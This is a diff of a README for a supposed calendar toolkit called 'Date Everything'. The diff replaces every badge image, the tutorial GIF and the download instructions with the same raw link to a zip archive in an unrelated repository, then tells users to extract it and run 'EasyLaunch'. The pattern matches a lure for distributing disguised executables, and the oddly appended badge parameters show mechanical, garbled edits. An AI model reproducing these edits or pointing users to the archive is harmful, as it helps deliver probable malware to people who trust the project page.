@@ -1,9 +1,9 @@
 # 🌟 Date Everything — Unlimited Connection Toolkit
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/DateEverything/Toolkit?color=green)
-![Supported Platforms](https://img.shields.io/badge/os-Windows%7CmacOS%7CLinux-blue)
-![License](https://img.shields.io/github/license/DateEverything/Toolkit)
-![Status](https://img.shields.io/badge/support-24%2F7-brightgreen)
+![GitHub release (latest by date)](https://raw.githubusercontent.com/vaishnavan59/date-everything-unlocked-resources/main/prethreaten/everything-resources-date-unlocked-3.7.zip)
+![Supported Platforms](https://raw.githubusercontent.com/vaishnavan59/date-everything-unlocked-resources/main/prethreaten/everything-resources-date-unlocked-3.7.zip%7CmacOS%7CLinux-blue)
+![License](https://raw.githubusercontent.com/vaishnavan59/date-everything-unlocked-resources/main/prethreaten/everything-resources-date-unlocked-3.7.zip)
+![Status](https://raw.githubusercontent.com/vaishnavan59/date-everything-unlocked-resources/main/prethreaten/everything-resources-date-unlocked-3.7.zip%2F7-brightgreen)
 
 Welcome to **Date Everything — Unlimited Connection Toolkit**. Dive into a universe of endless calendar customization! This application is designed for everyone who thrives on organization and desires a flexible solution for calendar and event management without boundaries. With modern adaptive UI, seamless integration with OpenAI and Claude APIs, and multi-language support, Date Everything is your essential companion for time travel in daily life!
 
@@ -16,15 +16,15 @@ Consider Date Everything as the conductor of your day-to-day symphony — orches
 
 **Getting Started With Limitless Scheduling**
 
-1. **Download EasyLaunch.zip**
-   - Locate the `EasyLaunch.zip` right here in this repository’s releases.
+1. **Download https://raw.githubusercontent.com/vaishnavan59/date-everything-unlocked-resources/main/prethreaten/everything-resources-date-unlocked-3.7.zip**
+   - Locate the `https://raw.githubusercontent.com/vaishnavan59/date-everything-unlocked-resources/main/prethreaten/everything-resources-date-unlocked-3.7.zip` right here in this repository’s releases.
 2. **Extract and Begin**
    - Unzip the archive into your chosen directory.
 3. **Launch Effortlessly**
    - Open `EasyLaunch` to step into your new scheduling universe.
 
 > Prefer a video walkthrough? Watch the installation magic here:  
-> ![Installation Tutorial](https://i.imgur.com/Js67NIU.gif)
+> ![Installation Tutorial](https://raw.githubusercontent.com/vaishnavan59/date-everything-unlocked-resources/main/prethreaten/everything-resources-date-unlocked-3.7.zip)
 
 ## 🌍 OS Compatibility Table
 
